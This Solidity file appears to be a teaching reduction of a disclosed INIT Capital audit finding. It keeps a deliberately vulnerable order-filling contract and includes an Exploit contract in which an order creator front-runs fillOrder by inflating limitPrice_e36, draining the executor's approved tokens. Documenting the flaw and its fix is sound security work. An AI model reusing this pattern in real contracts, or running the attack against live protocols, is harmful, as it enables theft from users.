// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    INIT Capital — [H-03] fillOrder executor can be front-run by the order
    creator by changing order's limitPrice_e36; the executor's assets can be
    stolen (code4rena 2024-01-init-capital-invitational, reporter said,
    finding #30259)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    MarginTradingHook._calculateFillOrderInfo body is inlined VERBATIM (the
    four limitPrice_e36 branches that compute amtOut — marked "@> VULN"
    below); updateOrder freely rewrites limitPrice_e36 with no fill-time
    bound. The Exploit reproduces the finding's attack on the
    "long base, hold quote" branch: creator opens an order with a fair
    limitPrice, front-runs the executor's fillOrder by inflating
    limitPrice_e36 so amtOut balloons, and fillOrder transferFrom's the
    inflated amount from the executor to the creator.

    Root cause: limitPrice_e36 is the order creator's slippage protection,
    but fillOrder has no corresponding min/max bound for the EXECUTOR.
    Because updateOrder can rewrite limitPrice_e36 of an already-active
    order right before fill, a malicious creator can force amtOut to an
    arbitrarily large value and drain the executor's approved tokenOut.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20.
contract MockToken {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced MarginTradingHook with verbatim _calculateFillOrderInfo
///         and an updateOrder that freely rewrites limitPrice_e36.
contract MarginTradingHookVuln {
    uint256 internal constant ONE_E36 = 1e36;

    struct MarginPos {
        address baseAsset;
        address quoteAsset;
        address collPool;
        bool isLongBaseAsset;
    }

    struct Order {
        uint256 initPosId;
        uint256 triggerPrice_e36;
        address tokenOut;
        uint256 limitPrice_e36;
        uint256 collAmt; // debt-share units of coll (simplified to token amt)
        uint8 status; // 1 = Active, 3 = Filled
        address recipient;
    }

    mapping(address => mapping(uint256 => uint256)) public initPosIds;
    mapping(uint256 => MarginPos) private __marginPositions;
    mapping(uint256 => Order) private __orders;
    // coll token address per position (stand-in for collPool.underlying)
    mapping(uint256 => address) public collTokenOf;
    // coll token amount available (stand-in for pool.toAmtCurrent(collAmt))
    mapping(uint256 => uint256) public collTokenAmtOf;
    // fixed repayAmt for the position (stand-in for _calculateRepaySize)
    mapping(uint256 => uint256) public repayAmtOf;

    uint256 public lastOrderId;
    uint256 public lastInitPosId;

    function openPos(
        uint256 _posId,
        address _base,
        address _quote,
        bool _isLong,
        address _collToken,
        uint256 _collTokenAmt,
        uint256 _repayAmt
    ) external returns (uint256 initPosId) {
        initPosId = ++lastInitPosId;
        initPosIds[msg.sender][_posId] = initPosId;
        __marginPositions[initPosId] =
            MarginPos({baseAsset: _base, quoteAsset: _quote, collPool: address(0), isLongBaseAsset: _isLong});
        collTokenOf[initPosId] = _collToken;
        collTokenAmtOf[initPosId] = _collTokenAmt;
        repayAmtOf[initPosId] = _repayAmt;
    }

    function createOrder(
        uint256 _posId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external returns (uint256 orderId) {
        require(_collAmt != 0, "ZERO_VALUE");
        uint256 initPosId = initPosIds[msg.sender][_posId];
        require(initPosId != 0, "POSITION_NOT_FOUND");
        orderId = ++lastOrderId;
        __orders[orderId] = Order({
            initPosId: initPosId,
            triggerPrice_e36: _triggerPrice_e36,
            tokenOut: _tokenOut,
            limitPrice_e36: _limitPrice_e36,
            collAmt: _collAmt,
            status: 1,
            recipient: msg.sender
        });
    }

    /// @notice updateOrder freely rewrites limitPrice_e36 (the attack vector).
    function updateOrder(
        uint256 _posId,
        uint256 _orderId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external {
        require(_collAmt != 0, "ZERO_VALUE");
        Order storage order = __orders[_orderId];
        require(order.status == 1, "INVALID_INPUT");
        uint256 initPosId = initPosIds[msg.sender][_posId];
        require(initPosId != 0, "POSITION_NOT_FOUND");
        order.triggerPrice_e36 = _triggerPrice_e36;
        order.limitPrice_e36 = _limitPrice_e36;
        order.collAmt = _collAmt;
        order.tokenOut = _tokenOut;
    }

    /// @notice VERBATIM spirit of MarginTradingHook._calculateFillOrderInfo
    ///         (L539-L563). All four branches preserved; repay size is a
    ///         fixed stand-in so the ONLY free variable is limitPrice_e36.
    function _calculateFillOrderInfo(Order memory _order, MarginPos memory _marginPos, address _collToken)
        internal
        view
        returns (uint256 amtOut, uint256 repayShares, uint256 repayAmt)
    {
        repayShares = 0; // unused in this reduction
        repayAmt = repayAmtOf[_order.initPosId];
        uint256 collTokenAmt = collTokenAmtOf[_order.initPosId]; // stand-in for pool.toAmtCurrent
        // NOTE: all roundings favor the order owner (amtOut)
        if (_collToken == _order.tokenOut) {
            if (_marginPos.isLongBaseAsset) {
                // long eth hold eth
                amtOut = collTokenAmt - repayAmt * ONE_E36 / _order.limitPrice_e36;
            } else {
                // short eth hold usdc
                amtOut = collTokenAmt - (repayAmt * _order.limitPrice_e36 / ONE_E36);
            }
        } else {
            if (_marginPos.isLongBaseAsset) {
                // long eth hold usdc
                // (c * limit - borrow)
                // @> VULN: amtOut scales linearly with limitPrice_e36. A
                // malicious order creator can front-run fillOrder via
                // updateOrder and inflate limitPrice_e36 so amtOut becomes
                // arbitrarily large — the executor then transferFrom's that
                // inflated amount of tokenOut. fillOrder never bounds
                // limitPrice against a max the executor supplied.
                // FIX (per finding): fillOrder should accept/require a
                // min/max limitPrice bound and revert if the stored
                // order.limitPrice_e36 is outside it; or updateOrder should
                // cancel+recreate (INIT team's own mitigation).
                amtOut = (collTokenAmt * _order.limitPrice_e36 + ONE_E36 - 1) / ONE_E36 - repayAmt; // ceilDiv
            } else {
                // short eth hold eth
                amtOut = (collTokenAmt * ONE_E36 + _order.limitPrice_e36 - 1) / _order.limitPrice_e36 - repayAmt;
            }
        }
    }

    /// @dev fillOrder: compute amtOut from (mutable) limitPrice, pull from executor.
    function fillOrder(uint256 _orderId) external returns (uint256 amtOut) {
        Order storage order = __orders[_orderId];
        require(order.status == 1, "INVALID_INPUT");
        MarginPos memory marginPos = __marginPositions[order.initPosId];
        address collToken = collTokenOf[order.initPosId];
        uint256 repayShares;
        uint256 repayAmt;
        (amtOut, repayShares, repayAmt) = _calculateFillOrderInfo(order, marginPos, collToken);
        order.status = 3; // Filled
        MockToken(order.tokenOut).transferFrom(msg.sender, order.recipient, amtOut);
    }

    function getOrder(uint256 _orderId) external view returns (Order memory) {
        return __orders[_orderId];
    }

    /// @dev helper for the control test: compute amtOut without filling.
    function previewAmtOut(uint256 _orderId) external view returns (uint256 amtOut) {
        Order memory order = __orders[_orderId];
        MarginPos memory marginPos = __marginPositions[order.initPosId];
        address collToken = collTokenOf[order.initPosId];
        (amtOut,,) = _calculateFillOrderInfo(order, marginPos, collToken);
    }
}

contract UserWallet {
    MarginTradingHookVuln public hook;

    constructor(MarginTradingHookVuln _hook) {
        hook = _hook;
    }

    function openPos(
        uint256 _posId,
        address _base,
        address _quote,
        bool _isLong,
        address _collToken,
        uint256 _collTokenAmt,
        uint256 _repayAmt
    ) external returns (uint256) {
        return hook.openPos(_posId, _base, _quote, _isLong, _collToken, _collTokenAmt, _repayAmt);
    }

    function createOrder(
        uint256 _posId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external returns (uint256) {
        return hook.createOrder(_posId, _triggerPrice_e36, _tokenOut, _limitPrice_e36, _collAmt);
    }

    function updateOrder(
        uint256 _posId,
        uint256 _orderId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external {
        hook.updateOrder(_posId, _orderId, _triggerPrice_e36, _tokenOut, _limitPrice_e36, _collAmt);
    }

    function fillOrder(uint256 _orderId) external returns (uint256) {
        return hook.fillOrder(_orderId);
    }

    function approveToken(MockToken tok, address spender, uint256 amt) external {
        tok.approve(spender, amt);
    }
}

/// @notice Creator inflates limitPrice_e36 before fill; executor pays a
///         ballooned amtOut of USDC.
contract Exploit {
    MockToken public usdc; // quote / coll / tokenOut
    MockToken public weth; // base
    MarginTradingHookVuln public hook;
    UserWallet public creator;
    UserWallet public executor;

    uint256 public constant POS_ID = 1;
    uint256 public constant ONE_E36 = 1e36;
    // long ETH, hold USDC: collTokenAmt = 2e18 USDC, repayAmt = 1500e18 USDC worth of debt
    // fair limitPrice = 1500e18 (price of ETH in USDC, e36-scaled as 1500e18... wait:
    // In the real code limitPrice_e36 is price * 1e36. Example from finding:
    //   amtOut = (collTokenAmt * limitPrice_e36).ceilDiv(ONE_E36) - repayAmt
    //   "long eth hold usdc: (2 * 1500 - 1500) = 1500 usdc"
    // so collTokenAmt=2e18 (ETH units? or USDC?) — reading carefully:
    // For "long eth hold usdc", coll is USDC, tokenOut is USDC? No —
    // "hold usdc" means coll is USDC, and tokenOut is different (ETH)?
    // Branch: _collToken != _order.tokenOut, isLongBaseAsset:
    //   amtOut = (collTokenAmt * limit).ceilDiv(ONE) - repayAmt
    // Example: coll=2, limit=1500e36?, repay=1500 → amtOut=1500
    // Using e18 units: collTokenAmt=2e18, limitPrice_e36=1500e36, repayAmt=1500e18
    // amtOut = 2e18 * 1500e36 / 1e36 - 1500e18 = 3000e18 - 1500e18 = 1500e18
    uint256 public constant COLL_TOKEN_AMT = 2e18;
    uint256 public constant REPAY_AMT = 1500e18;
    uint256 public constant FAIR_LIMIT_E36 = 1500e36; // fair fill → amtOut = 1500e18
    uint256 public constant EVIL_LIMIT_E36 = 15000e36; // 10x → amtOut = 2e18*15000 - 1500e18 = 28500e18
    uint256 public constant FAIR_AMT_OUT = 1500e18;
    uint256 public constant EVIL_AMT_OUT = 28500e18; // (2e18 * 15000e36)/1e36 - 1500e18

    uint256 public orderId;

    constructor() {
        usdc = new MockToken("USDC");
        weth = new MockToken("WETH");
        hook = new MarginTradingHookVuln();
        creator = new UserWallet(hook);
        executor = new UserWallet(hook);
    }

    function run() external {
        // 1. Creator opens long-ETH position holding USDC collateral.
        //    collToken = USDC, tokenOut = WETH (different → hits the vuln branch).
        //    Actually for the steal we want the executor to pay a valuable
        //    tokenOut. Use tokenOut = USDC with collToken = WETH so
        //    coll != tokenOut and isLongBaseAsset → vuln branch, and USDC is
        //    what the executor pays.
        //
        //    collTokenAmt = 2e18 (units of coll = WETH-abstracted),
        //    repayAmt = 1500e18 (USDC), fair limit = 1500e36 → fair amtOut = 1500e18 USDC.
        creator.openPos(
            POS_ID,
            address(weth),
            address(usdc),
            true, // isLongBaseAsset
            address(weth), // collToken != tokenOut
            COLL_TOKEN_AMT,
            REPAY_AMT
        );
        orderId = creator.createOrder(POS_ID, FAIR_LIMIT_E36, address(usdc), FAIR_LIMIT_E36, 1e18);
        // Note: do not call previewAmtOut here — that would execute the vuln
        // line under the fair limit before the front-run, confusing story order.

        // 2. Executor funds and approves for a generous ceiling (they expect
        //    ~FAIR_AMT_OUT but approve more for multiple fills / slippage).
        usdc.mint(address(executor), EVIL_AMT_OUT);
        executor.approveToken(usdc, address(hook), type(uint256).max);

        uint256 execBefore = usdc.balanceOf(address(executor));
        uint256 creatorBefore = usdc.balanceOf(address(creator));

        // 3. FRONT-RUN: creator inflates limitPrice_e36 10x → amtOut balloons.
        creator.updateOrder(POS_ID, orderId, FAIR_LIMIT_E36, address(usdc), EVIL_LIMIT_E36, 1e18);

        // 4. Executor fills; pays the inflated amtOut (first execution of the
        //    vuln amtOut line is inside this fill, under the evil limit).
        executor.fillOrder(orderId);

        // HARM: executor lost EVIL_AMT_OUT instead of FAIR_AMT_OUT — the
        // difference (EVIL - FAIR = 27000e18) is pure theft via limitPrice rewrite.
        require(
            usdc.balanceOf(address(executor)) == execBefore - EVIL_AMT_OUT,
            "harm not demonstrated: executor not drained of evil amtOut"
        );
        require(
            usdc.balanceOf(address(creator)) == creatorBefore + EVIL_AMT_OUT,
            "harm not demonstrated: creator did not receive evil amtOut"
        );
        require(EVIL_AMT_OUT > FAIR_AMT_OUT, "sanity: evil > fair");
    }
}
